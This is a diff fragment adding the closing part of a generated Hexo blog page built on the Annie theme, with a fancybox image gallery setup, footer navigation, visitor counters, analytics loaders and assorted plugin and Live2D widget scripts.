+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2019 - 2020, content by Thriumph. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+		
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+
+		<span id="busuanzi_container_page_pv">
+	  		本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+		</span>
+
+	
+
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	<script src="/plugin/motto/motto.js"></script>
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+	<script src="/plugin/love/love.js"></script>
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	<script>
+		var _hmt = _hmt || [];
+		(function() {
+			var hm = document.createElement("script");
+			hm.src = "//hm.baidu.com/hm.js?";
+			var s = document.getElementsByTagName("script")[0];
+			s.parentNode.insertBefore(hm, s);
+		})();
+	</script>
+
+	
+	<script src="//s6.cnzz.com/stat.php?id=&web_id=" type="text/javascript"></script>
+
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+  <script src="/plugin/leancloud/av-min.js"></script>
+<script src="/js/leancloud-count.js"></script>
+
+	
+
+  
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":200,"height":400,"hOffset":-20,"vOffset":80},"mobile":{"show":false}});</script></body>	
+</html>
